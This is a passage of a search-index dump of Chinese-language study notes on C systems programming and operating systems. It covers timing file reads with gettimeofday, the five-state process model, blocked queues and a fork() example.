<p>\u6587\u4ef6\u8def\u5f84\uff08\u4f8b\u5982 /tmp/huge\uff09</p> </li> <li> <p>\u8f93\u5165\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff08\u4f8b\u5982 1000 \u5b57\u8282\uff09</p> </li> </ul> <pre><code>./readtest /tmp/huge 1000\n</code></pre>"},{"location":"cs/c/4.3/#time-measurement","title":"Time measurement","text":"<ul> <li> <p>\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u95f4</p> </li> <li> <p>\u8bfb\u53d6\u6587\u4ef6\u7684\u65f6\u95f4\uff08\u6309\u4e0d\u540c\u7684\u7f13\u51b2\u533a\u5927\u5c0f\uff09</p> </li> </ul>"},{"location":"cs/c/4.3/#sample-solution","title":"Sample solution","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/time.h&gt;\n\nvoid measure_time(const char* filename, size_t buffer_size) {\n    int fd = open(filename, O_RDONLY);\n    if (fd &lt; 0) {\n        perror(\"open\");\n        exit(EXIT_FAILURE);\n    }\n\n    char *buffer = malloc(buffer_size);\n    if (buffer == NULL) {\n        perror(\"malloc\");\n        exit(EXIT_FAILURE);\n    }\n\n    ssize_t bytes_read;\n    struct timeval start, end;\n\n    // Start time measurement\n    gettimeofday(&amp;start, NULL);\n\n    while ((bytes_read = read(fd, buffer, buffer_size)) &gt; 0) {\n        // Do nothing with the data, just measure read time\n    }\n\n    // End time measurement\n    gettimeofday(&amp;end, NULL);\n\n    close(fd);\n    free(buffer);\n\n    if (bytes_read &lt; 0) {\n        perror(\"read\");\n        exit(EXIT_FAILURE);\n    }\n\n    long seconds = end.tv_sec - start.tv_sec;\n    long microseconds = end.tv_usec - start.tv_usec;\n    double elapsed = seconds + microseconds*1e-6;\n\n    printf(\"Time taken: %.6f seconds\\n\", elapsed);\n}\n\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        fprintf(stderr, \"Usage: %s &lt;filename&gt; &lt;buffer_size&gt;\\n\", argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    const char *filename = argv[1];\n    size_t buffer_size = atoi(argv[2]);\n\n    measure_time(filename, buffer_size);\n\n    return 0;\n}\n</code></pre> <p>\u5b9e\u73b0\u7684\u6838\u5fc3\u5c31\u662f\u7528 gettimeofday \u51fd\u6570\u8ba1\u7b97\u5f53\u5929\u65f6\u95f4\u70b9\uff0c\u76f8\u5173\u4f7f\u7528\u7ec6\u8282\u67e5\u770b section 2.4, \u6700\u540e\u6559\u6388\u7528 google js \u7684\u4e00\u4e2a\u5de5\u5177\u7ed3\u5408 bash \u6587\u4ef6\u751f\u6210\u4e86\u4e00\u4e2a\u6570\u636e\u53ef\u89c6\u5316\u56fe\u8868\uff0c\u6beb\u79d2 vs buffersize, \u4e5f\u53ef\u4ee5\u7528 Excel \u6216\u8005 python matplotlib \u505a</p> <p><code>open plot.html</code> \u4f1a\u76f4\u63a5\u5728\u9ed8\u8ba4\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u6587\u4ef6</p> <pre><code>import matplotlib.pyplot as plt\n\nsizes = []\ntimes = []\n\nwith open('results.txt', 'r') as file:\n    for line in file:\n        size, time = line.split()\n        sizes.append(int(size))\n        times.append(float(time))\n\nplt.plot(sizes, times, 'o-')\nplt.xlabel('Buffer Size (bytes)')\nplt.ylabel('Time Taken (seconds)')\nplt.title('Time Taken vs Buffer Size')\nplt.show()\n</code></pre> <p>\u8fd9\u79cd\u7a0b\u5e8f\u5728\u65e5\u540e\u80fd\u591f\u7528\u4e8e\u5206\u6790\u7a0b\u5e8f\u7684\u5185\u5b58\u5360\u7528\u7684\u5de5\u5177\u7684\u8bbe\u8ba1\u601d\u8def</p>"},{"location":"cs/c/4.3/#lab","title":"Lab","text":"<p>\u6ca1\u65f6\u95f4\uff0c\u540e\u7eed\u8865\u4e0a\uff0c\u5148\u770b sample \u9898\u76ee</p>"},{"location":"cs/c/5.1/","title":"5.1 Processes","text":""},{"location":"cs/c/5.1/#mon-lecture","title":"Mon Lecture","text":"<p>\u8fdb\u5ea6\u76ee\u524d\u521a\u521a\u5230 Lecture 8 \u6bd4\u8f83\u8d76\uff0cmidterm \u751a\u81f3\u6db5\u76d6 Lecture 9</p> <p>\u53d8\u91cf\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u5185\u5b58\u4f4d\u7f6e\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5bf9\u5176\u4f4d\u7f6e\u8fdb\u884c\u8bb0\u5fc6</p> <p>\u4e0a\u4e0b\u6587\u5207\u6362\uff08Context Switch\uff09\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u591a\u4efb\u52a1\u73af\u5883\u4e2d\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u5173\u952e\u64cd\u4f5c\u3002\u5b83\u6307\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u4e4b\u95f4\u5207\u6362\u65f6\u6240\u9700\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u72b6\u6001\u548c\u52a0\u8f7d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u72b6\u6001\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u662f\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u5e76\u53d1\u7684\u57fa\u7840\u3002</p>"},{"location":"cs/c/5.1/#states","title":"States","text":"<p>\u8ba1\u7b97\u673a\u53ef\u80fd\u6709\u4e94\u516d\u767e\u4e2a\u8fdb\u7a0b\uff0c\u5c06\u8fd9\u4e9b\u8fdb\u7a0b\u653e\u8fdb arrary \u7ed3\u6784\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\uff0clink list \u4e0a\u4e0b\u8fde\u63a5\uff0c\u67e5\u770b\u542f\u52a8\u505c\u6b62\uff0c</p> <p>two possible process states that a process may be in at any one time: Running and Ready.</p> <p>\u5206\u9875\u673a\u5236\uff1a</p> <ul> <li> <p>\u5206\u9875\uff08Paging\uff09 \u662f\u4e00\u79cd\u5185\u5b58\u7ba1\u7406\u65b9\u6848\uff0c\u5c06\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5212\u5206\u4e3a\u9875\u9762\uff0c\u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u4e3a\u76f8\u540c\u5927\u5c0f\u7684\u9875\u6846\u3002</p> </li> <li> <p>\u5f53\u8fdb\u7a0b\u9700\u8981\u8bbf\u95ee\u5185\u5b58\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u9875\u8868\uff0c\u9875\u8868\u8bb0\u5f55\u4e86\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u6846\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\u3002</p> </li> </ul>"},{"location":"cs/c/5.1/#transition","title":"Transition","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u5177\u6709\u8c03\u5ea6\u5458\u7684\u89d2\u8272 - \u6839\u636e\u67d0\u4e9b\u5b9a\u4e49\u7684\u7b56\u7565\u4e3a\u5904\u7406\u5668\u5206\u6d3e\u5de5\u4f5c \u89e3\u51b3\u516c\u5e73\u6027\u3001\u4f18\u5148\u7ea7\u3001\u660e\u663e\u7684\u201c\u4e92\u52a8\u6027\u201d\u7b49\u95ee\u9898\u3002</p> <p></p> <p>fork parent child</p>"},{"location":"cs/c/5.1/#termination","title":"Termination","text":"<p><code>ulimate -a</code> \u80fd\u591f\u8bbe\u7f6e\u7a0b\u5e8f\u8fd0\u884c\u65f6\u95f4\u548c\u5360\u7528\u5185\u5b58\u7b49\u53c2\u6570</p> <p>\u65f6\u949f\u662f\u5426\u6b63\u5728\u8fd0\u884c\uff0c\u4f1a\u5bf9\u68c0\u67e5</p> <p>\u907f\u514d\u8fdb\u7a0b\u95f2\u7f6e\uff0c\u5728\u8fd0\u884c\u522b\u7684\u8fdb\u7a0b\u7684 IO \u963b\u585e\u7684\u65f6\u5019\u6267\u884c\u7684\u522b\u7684\u4e1c\u897f blocking </p> <p></p> <p>dispatch \u662f\u6d3e\u9063\u7684\u610f\u601d admit \u8ba4\u9886</p> <p>The 5-State Model of Process Execution \u662f\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u8fdb\u7a0b\u72b6\u6001\u8f6c\u6362\u7684\u7ecf\u5178\u6a21\u578b\u3002\u5b83\u5b9a\u4e49\u4e86\u8fdb\u7a0b\u5728\u6267\u884c\u671f\u95f4\u53ef\u80fd\u5904\u4e8e\u7684\u4e94\u79cd\u72b6\u6001\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u8f6c\u6362\u5173\u7cfb\u3002\u4ee5\u4e0b\u662f\u8fd9\u4e94\u4e2a\u72b6\u6001\u53ca\u5176\u89e3\u91ca\uff1a</p>"},{"location":"cs/c/5.1/#1-new","title":"1. New\uff08\u65b0\u5efa\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521a\u88ab\u521b\u5efa\u65f6\uff0c\u5b83\u5904\u4e8e New \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u4e86\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u5e76\u4e3a\u8fdb\u7a0b\u5efa\u7acb\u4e86\u76f8\u5173\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u8fdb\u7a0b\u8fd8\u6ca1\u6709\u51c6\u5907\u597d\u8fd0\u884c\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5b8c\u6210\u5bf9\u65b0\u8fdb\u7a0b\u7684\u521d\u59cb\u5316\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165 Ready \u72b6\u6001\uff0c\u51c6\u5907\u88ab\u8c03\u5ea6\u5668\u8c03\u5ea6\u3002</li> </ul>"},{"location":"cs/c/5.1/#2-ready","title":"2. Ready\uff08\u5c31\u7eea\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5904\u4e8e Ready \u72b6\u6001\u7684\u8fdb\u7a0b\u5df2\u7ecf\u5206\u914d\u4e86\u6240\u9700\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u51c6\u5907\u597d\u8fd0\u884c\u3002\u5b83\u6b63\u5728\u7b49\u5f85 CPU \u8d44\u6e90\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5f53\u8c03\u5ea6\u5668\u51b3\u5b9a\u5c06 CPU \u5206\u914d\u7ed9\u8be5\u8fdb\u7a0b\u65f6\uff0c\u5b83\u4f1a\u4ece Ready \u72b6\u6001\u8f6c\u79fb\u5230 Running \u72b6\u6001\u3002</li> </ul>"},{"location":"cs/c/5.1/#3-running","title":"3. Running\uff08\u8fd0\u884c\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u8fdb\u7a0b\u88ab\u5206\u914d\u5230 CPU \u5e76\u6b63\u5728\u6267\u884c\u65f6\uff0c\u5904\u4e8e Running \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u8fdb\u7a0b\u5b9e\u9645\u5360\u7528 CPU \u5e76\u6267\u884c\u6307\u4ee4\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u8fdb\u7a0b\u53ef\u80fd\u4ece Running \u72b6\u6001\u8f6c\u79fb\u5230\u4ee5\u4e0b\u51e0\u79cd\u72b6\u6001\uff1a<ul> <li>Blocked\uff1a\u5982\u679c\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u79cd\u8d44\u6e90\uff08\u5982 I/O \u64cd\u4f5c\uff09\uff0c\u5b83\u4f1a\u8fdb\u5165 Blocked \u72b6\u6001\u3002</li> <li>Ready\uff1a\u5982\u679c\u8fdb\u7a0b\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u4f46\u8fd8\u6ca1\u6709\u5b8c\u6210\uff0c\u5b83\u4f1a\u56de\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Terminated\uff1a\u5982\u679c\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u5f3a\u5236\u7ec8\u6b62\uff0c\u5b83\u4f1a\u8fdb\u5165 Terminated \u72b6\u6001\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#4-blocked","title":"4. Blocked\uff08\u963b\u585e\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u83b7\u53d6\u8d44\u6e90\u7b49\uff09\u65f6\uff0c\u5b83\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u5728\u8fd9\u4e2a\u72b6\u6001\u4e0b\uff0c\u8fdb\u7a0b\u4e0d\u80fd\u8fd0\u884c\uff0c\u751a\u81f3\u4e0d\u80fd\u88ab\u8c03\u5ea6\uff0c\u76f4\u5230\u4e8b\u4ef6\u53d1\u751f\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u4e00\u65e6\u7b49\u5f85\u7684\u4e8b\u4ef6\u53d1\u751f\uff0c\u8fdb\u7a0b\u4f1a\u4ece Blocked \u72b6\u6001\u8f6c\u79fb\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85 CPU \u5206\u914d\u3002</li> </ul>"},{"location":"cs/c/5.1/#5-terminated","title":"5. Terminated\uff08\u7ec8\u6b62\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u8fdb\u7a0b\u5b8c\u6210\u6267\u884c\u6216\u88ab\u64cd\u4f5c\u7cfb\u7edf\u7ec8\u6b62\u65f6\uff0c\u5b83\u8fdb\u5165 Terminated \u72b6\u6001\u3002\u6b64\u65f6\u8fdb\u7a0b\u7684\u6267\u884c\u7ed3\u675f\uff0c\u6240\u6709\u7684\u8d44\u6e90\u90fd\u5c06\u88ab\u91ca\u653e\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5728\u8fdb\u7a0b\u7ec8\u6b62\u4e4b\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u6e05\u7406\u8fdb\u7a0b\u6240\u4f7f\u7528\u7684\u8d44\u6e90\uff0c\u5305\u62ec\u5185\u5b58\u3001\u6587\u4ef6\u63cf\u8ff0\u7b26\u7b49\u3002</li> </ul>"},{"location":"cs/c/5.1/#_1","title":"\u72b6\u6001\u8f6c\u6362\u56fe","text":"<p>\u4ee5\u4e0b\u662f\u8fdb\u7a0b\u5728\u4e0d\u540c\u72b6\u6001\u4e4b\u95f4\u8f6c\u6362\u7684\u4e3b\u8981\u65b9\u5f0f\uff1a</p> <ul> <li>New \u2192 Ready\uff1a\u8fdb\u7a0b\u521d\u59cb\u5316\u5b8c\u6210\uff0c\u51c6\u5907\u6267\u884c\u3002</li> <li>Ready \u2192 Running\uff1a\u8c03\u5ea6\u5668\u9009\u62e9\u8fdb\u7a0b\u5e76\u5206\u914d CPU\u3002</li> <li>Running \u2192 Blocked\uff1a\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\uff09\u3002</li> <li>Blocked \u2192 Ready\uff1a\u4e8b\u4ef6\u53d1\u751f\uff08\u5982 I/O \u5b8c\u6210\uff09\uff0c\u8fdb\u7a0b\u51c6\u5907\u518d\u6b21\u6267\u884c\u3002</li> <li>Running \u2192 Ready\uff1a\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u8fdb\u7a0b\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Running \u2192 Terminated\uff1a\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u7ec8\u6b62\u3002</li> </ul> <p>The 5-State Model \u63cf\u8ff0\u4e86\u8fdb\u7a0b\u4ece\u521b\u5efa\u5230\u7ec8\u6b62\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u53ef\u80fd\u7ecf\u5386\u7684\u4e94\u79cd\u72b6\u6001\u3002\u8fd9\u4e94\u79cd\u72b6\u6001\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u80fd\u591f\u6709\u6548\u5730\u8c03\u5ea6\u548c\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u786e\u4fdd\u8d44\u6e90\u7684\u5408\u7406\u5229\u7528\u548c\u8fdb\u7a0b\u7684\u5e76\u53d1\u6267\u884c\u3002</p>"},{"location":"cs/c/5.2/","title":"5.2 Multiple Blocked States","text":""},{"location":"cs/c/5.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u591a\u963b\u585e\u961f\u5217\u6a21\u578b\uff0c\u907f\u514d\u4e00\u4e2a\u4efb\u52a1\u5728 CPU \u6216 I/O \u7b49\u963b\u585e\u540e\u62d6\u6162\u8fdb\u5ea6</p> <p>\u8be5\u56fe\u5c55\u793a\u4e86\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684 Multiple Blocked Queues\uff08\u591a\u963b\u585e\u961f\u5217\uff09 \u6a21\u578b\u3002\u5728\u8fd9\u4e2a\u6a21\u578b\u4e2d\uff0c\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u4e8b\u4ef6\u800c\u8fdb\u5165\u963b\u585e\u72b6\u6001\uff0c\u5e76\u4e14\u6bcf\u4e2a\u963b\u585e\u72b6\u6001\u5bf9\u5e94\u4e00\u4e2a\u4e8b\u4ef6\u961f\u5217\u3002\u8fd9\u6709\u52a9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u66f4\u9ad8\u6548\u5730\u7ba1\u7406\u8fdb\u7a0b\u7684\u8c03\u5ea6\u3002</p>"},{"location":"cs/c/5.2/#_1","title":"\u56fe\u4e2d\u5173\u952e\u90e8\u5206\u7684\u89e3\u91ca\uff1a","text":"<ol> <li>Ready Queue\uff08\u5c31\u7eea\u961f\u5217\uff09\uff1a</li> <li> <p>\u6240\u6709\u51c6\u5907\u597d\u6267\u884c\u7684\u8fdb\u7a0b\u90fd\u88ab\u653e\u5728 Ready Queue \u4e2d\uff0c\u7b49\u5f85\u8c03\u5ea6\u5668\u5206\u914d CPU\u3002\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u8fdb\u7a0b\u4ece Ready Queue \u4e2d\u8c03\u5ea6\uff08Dispatch\uff09\u5e76\u5f00\u59cb\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002</p> </li> <li> <p>Processor\uff08\u5904\u7406\u5668\uff09\uff1a</p> </li> <li> <p>\u5904\u7406\u5668\u6267\u884c\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u8c03\u5ea6\u7684\u8fdb\u7a0b\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528 CPU \u8fdb\u884c\u8ba1\u7b97\u548c\u6267\u884c\u6307\u4ee4\u3002</p> </li> <li> <p>Timeout\uff08\u8d85\u65f6\uff09\uff1a</p> </li> <li> <p>\u5982\u679c\u5206\u914d\u7ed9\u8fdb\u7a0b\u7684\u65f6\u95f4\u7247\uff08CPU \u65f6\u95f4\uff09\u7528\u5b8c\u4e86\uff0c\u8fdb\u7a0b\u5c06\u8fd4\u56de Ready Queue\uff0c\u7b49\u5f85\u4e0b\u4e00\u4e2a\u8c03\u5ea6\u5468\u671f\u3002</p> </li> <li> <p>Event n Wait\uff08\u7b49\u5f85\u4e8b\u4ef6 n\uff09\uff1a</p> </li> <li> <p>\u5982\u679c\u8fd0\u884c\u4e2d\u7684\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u4e2a\u5916\u90e8\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u5b83\u5c06\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u79fb\u9664\uff0c\u5e76\u8fdb\u5165\u76f8\u5e94\u7684 Event Queue\uff08\u4e8b\u4ef6\u961f\u5217\uff09\u4e2d\uff0c\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u8fd9\u4e2a\u6a21\u578b\u4f7f\u7528\u591a\u4e2a\u963b\u585e\u961f\u5217\uff0c\u4ee3\u8868\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u7684\u4e8b\u4ef6\uff08\u5982\u591a\u4e2a I/O \u64cd\u4f5c\uff09\u8fdb\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\u3002</p> </li> <li> <p>Event n Queue\uff08\u4e8b\u4ef6 n \u963b\u585e\u961f\u5217\uff09\uff1a</p> </li> <li> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u9700\u8981\u7b49\u5f85\u7684\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u4fe1\u53f7\u7b49\uff09\uff0c\u90fd\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u961f\u5217\u3002\u88ab\u963b\u585e\u7684\u8fdb\u7a0b\u8fdb\u5165\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\uff0c\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\u3002</p> </li> <li> <p>Event n Occurs\uff08\u4e8b\u4ef6 n \u53d1\u751f\uff09\uff1a</p> </li> <li> <p>\u5f53\u67d0\u4e2a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u4f8b\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88ab\u79fb\u51fa\u5e76\u653e\u56de Ready Queue\uff0c\u51c6\u5907\u518d\u6b21\u88ab\u8c03\u5ea6\u6267\u884c\u3002</p> </li> <li> <p>Release\uff08\u91ca\u653e\uff09\uff1a</p> </li> <li>\u5f53\u8fdb\u7a0b\u5b8c\u6210\u6240\u6709\u4efb\u52a1\u65f6\uff0c\u5b83\u4f1a\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u91ca\u653e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8be5\u8fdb\u7a0b\u7684\u6267\u884c\u3002</li> </ol> <p>Multiple Blocked Queues \u6a21\u578b\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u6839\u636e\u4e0d\u540c\u4e8b\u4ef6\u5c06\u8fdb\u7a0b\u653e\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\uff0c\u7b49\u5f85\u76f8\u5e94\u4e8b\u4ef6\u7684\u5b8c\u6210\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u5e76\u63d0\u9ad8\u7cfb\u7edf\u7684\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002</p> <p>\u963b\u585e\u8fdb\u7a0b\u542f\u7528\u865a\u62df\u5185\u5b58\u8c03\u7528\u5b58\u5165 disk \u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63d0\u4f9b\u66f4\u591a\u5185\u5b58\u652f\u6301\u5176\u4ed6\u4efb\u52a1\uff0c\u5f53\u6ca1\u6709\u5176\u4ed6\u4efb\u52a1\u7684\u65f6\u5019\u4ece\u4e2d\u53d6\u51fa\u518d\u7ee7\u7eed\u6267\u884c\uff0c\u53d6\u51fa\u4e4b\u524d\u79f0\u4e4b\u4e3a Suspend \u72b6\u6001</p> <p>\u7cfb\u7edf\u8c03\u7528 fork system call:</p> <p>\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u5b8c\u5168 copy \u5386\u53f2\u4e2d\u53eb\u514b\u9686\u8fc7\u7a0b fork </p>"},{"location":"cs/c/5.2/#creating-a-new-process-using-fork","title":"Creating a new process using fork()","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;unistd.h&gt;\n\nvoid function(void)\n{\n    int  pid;                 // some systems define a pid_t\n\n    switch (pid = fork()) {\n    case -1 :\n        printf(\"fork() failed\\n\");     // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                   // new child process\n        printf(\"c:  value of pid=%i\\n\", pid);\n        printf(\"c:  child's pid=%i\\n\", getpid());\n        printf(\"c:  child's parent pid=%i\\n\", getppid());\n        break;\n\n    default:                  // original parent process\n        sleep(1);\n        printf(\"p:  value of pid=%i\\n\", pid);\n        printf(\"p:  parent's pid=%i\\n\", getpid());\n        printf(\"p:  parent's parent pid=%i\\n\", getppid());\n        break;\n    }\n    fflush(stdout);\n}\n</code></pre> <p>fork() \u662f UNIX \u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u3002\u5b83\u4f1a\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u7236\u8fdb\u7a0b\u201d\uff09\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\u7684\u65b0\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u5b50\u8fdb\u7a0b\u201d\uff09\u3002\u65b0\u8fdb\u7a0b\u7684\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u4e0e\u7236\u8fdb\u7a0b\u4e00\u81f4\uff0c\u4f46\u5b83\u4eec\u662f\u72ec\u7acb\u8fd0\u884c\u7684\u3002</p> <p>fork() \u8c03\u7528\u7684\u8fd4\u56de\u503c\uff1a</p> <ul> <li>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID (PID)\u3002</li> <li>\u5728\u5b50\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de 0\u3002</li> <li>\u5982\u679c fork() \u8c03\u7528\u5931\u8d25\uff0c\u5219\u8fd4\u56de -1\u3002</li> </ul> <p>\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u90fd\u4f1a\u6709\u4e00\u4e2a\u72ec\u7acb\u7684 pid\u3002</p> <p>fork() \u8c03\u7528\u4f1a\u5c1d\u8bd5\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u3002\u5982\u679c fork() \u5931\u8d25\uff08\u8fd4\u56de -1\uff09\uff0c\u7a0b\u5e8f\u4f1a\u6253\u5370 \u201cfork() failed\u201d \u5e76\u7ec8\u6b62\u3002</p> <p>\u5982\u679c fork() \u5728\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de 0\uff0c\u8fdb\u5165 case 0\u3002\u8fd9\u4e2a\u5757\u6253\u5370\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\uff0c\u5305\u62ec pid\u3001getpid() \u548c getppid()\uff0c\u5206\u522b\u662f\u5b50\u8fdb\u7a0b\u81ea\u5df1\u7684\u8fdb\u7a0b ID \u548c\u7236\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u56e0\u6b64\u4f1a\u8fdb\u5165 default\u3002\u7236\u8fdb\u7a0b\u4f1a\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u79d2\u949f\uff08sleep(1)\uff09\uff0c\u7136\u540e\u8f93\u51fa\u81ea\u8eab\u548c\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u9632\u6b62\u7236\u5b50\u540c\u65f6\u8fd0\u884c\u5bfc\u81f4\u4e00\u4e9b\u6df7\u4e71\u60c5\u51b5\u3002</p> <p>\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5e76\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u4e13\u95e8\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u8ba9\u7236\u8fdb\u7a0b\u80fd\u591f\u5728\u4e4b\u540e\u201c\u67e5\u627e\u201d\u6216\u201c\u67e5\u8be2\u201d\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u8fdb\u7a0b 